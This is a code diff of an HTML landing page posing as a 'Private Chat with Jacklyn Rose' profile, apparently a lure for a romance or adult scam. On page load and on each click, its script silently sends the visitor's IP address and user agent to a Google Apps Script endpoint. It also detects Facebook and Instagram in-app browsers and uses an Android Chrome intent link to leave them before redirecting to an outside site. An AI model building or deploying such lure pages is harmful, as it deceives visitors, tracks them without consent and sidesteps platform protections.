@@ -4,43 +4,26 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Private Chat with Jacklyn</title>
-
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://jacklyn-rosex.pages.dev/">
-    <meta property="og:title" content="Private Chat with Jacklyn Rose">
-    <meta property="og:description" content="Active Now for Private Conversation & Video Calls. Connect securely.">
-    <meta property="og:image" content="https://jacklyn-rosex.pages.dev/og-image.webp">
-
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
         body { background: #0f0f0f; display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #fff; overflow-x: hidden; }
-        
-        .container { width: 95%; max-width: 400px; text-align: center; background: rgba(255, 255, 255, 0.05); padding: 40px 20px; border-radius: 30px; border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); box-shadow: 0 25px 50px rgba(0,0,0,0.5); position: relative; z-index: 1; }
+        .container { width: 95%; max-width: 400px; text-align: center; background: rgba(255, 255, 255, 0.05); padding: 40px 20px; border-radius: 30px; border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
         .profile-container { position: relative; width: 140px; height: 140px; margin: 0 auto 20px; }
         .profile-pic { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 4px solid #0084ff; padding: 3px; }
         .online-dot { position: absolute; bottom: 10px; right: 10px; width: 22px; height: 22px; background: #31a24c; border: 3px solid #1a1a1a; border-radius: 50%; }
         h1 { font-size: 24px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 8px; }
         .verified { color: #0084ff; font-size: 18px; }
-        p { color: #b0b3b8; font-size: 15px; margin-top: 10px; line-height: 1.5; }
         .stats { display: flex; justify-content: center; gap: 20px; margin: 25px 0; }
         .stat-box { text-align: center; }
         .stat-num { display: block; font-weight: bold; font-size: 18px; }
         .stat-label { font-size: 12px; color: #888; }
-        .btn-chat { 
-            display: block; background: linear-gradient(45deg, #0084ff, #00c6ff); 
-            color: white; text-decoration: none; padding: 16px; border-radius: 50px; 
-            font-weight: bold; font-size: 18px; transition: 0.3s; 
-            box-shadow: 0 10px 20px rgba(0, 132, 255, 0.3); cursor: pointer; border: none; width: 100%;
-        }
-        .btn-chat:active { transform: scale(0.95); }
-        .footer-note { font-size: 11px; color: #555; margin-top: 30px; letter-spacing: 0.5px; text-transform: uppercase; }
+        .btn-chat { display: block; background: linear-gradient(45deg, #0084ff, #00c6ff); color: white; text-decoration: none; padding: 16px; border-radius: 50px; font-weight: bold; font-size: 18px; transition: 0.3s; cursor: pointer; border: none; width: 100%; }
     </style>
 </head>
 <body>
 
-    <div class="container" id="landingPage">
+    <div class="container">
         <div class="profile-container">
             <img src="og-image.webp" alt="Jacklyn Rose" class="profile-pic">
             <div class="online-dot"></div>
@@ -54,14 +37,13 @@
         <button class="btn-chat" id="chatBtn" onclick="handleStartChat()">
             <i class="fa-brands fa-facebook-messenger"></i> Start Private Chat
         </button>
-        <div class="footer-note">Secure & Encrypted Connection</div>
     </div>
 
     <script>
         const TARGET_URL = 'messenger.jacklyn.site'; 
-        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbz3MfTmEC6IhiQp9DvLrsKRFY-ua8x9O6V1z86BtiwCMhQOohRLMCzKP0F7Ulpw0sle/exec';
+        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxr9BXhUgsBNQ4P55z87Lfv4CKkc5MZx-GYu75ZcZzV-sT3jygR7U-A3DjLXDxnKgum/exec';
 
-        async function sendAnalytics(eventType) {
+        async function sendEvent(type) {
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
@@ -69,49 +51,33 @@
                 fetch(SCRIPT_URL, {
                     method: 'POST',
                     mode: 'no-cors',
+                    keepalive: true,
                     body: JSON.stringify({
                         ip: ipData.ip,
-                        event: eventType,
+                        event: type,
                         userAgent: navigator.userAgent
                     })
                 });
-            } catch (e) {
-                console.log("Analytics error.");
-            }
+            } catch (e) {}
         }
 
-        // পেজ ভিজিট অটো ট্র্যাক
-        window.onload = () => {
-            sendAnalytics('Visit');
-        };
+        // পেজ লোড হলেই ভিজিট কাউন্ট
+        window.onload = () => sendEvent('Visit');
 
         async function handleStartChat() {
             const btn = document.getElementById('chatBtn');
-            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Processing...';
+            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Connecting...';
             
             const ua = navigator.userAgent || navigator.vendor || window.opera;
             const isFB = (ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1 || ua.indexOf("Instagram") > -1);
             
-            // ইভেন্ট টাইপ নির্ধারণ
-            const eventType = isFB ? 'Chrome_Redirect' : 'Click';
-            
-            // ট্র্যাক পাঠানো
-            await sendAnalytics(eventType);
+            // ক্লিক টাইপ ট্র্যাক
+            sendEvent(isFB ? 'Chrome_Redirect' : 'Click');
 
-            // রিডাইরেক্ট লজিক
             setTimeout(() => {
                 const chromeIntent = "intent://" + TARGET_URL + "#Intent;scheme=https;package=com.android.chrome;end";
-                if (isFB) {
-                    window.location.href = chromeIntent;
-                } else {
-                    window.location.href = "https://" + TARGET_URL;
-                }
-                
-                // Fallback
-                setTimeout(() => {
-                    window.location.href = "https://" + TARGET_URL;
-                }, 1500);
-            }, 300);
+                window.location.href = isFB ? chromeIntent : "https://" + TARGET_URL;
+            }, 400); 
         }
     </script>
 </body>
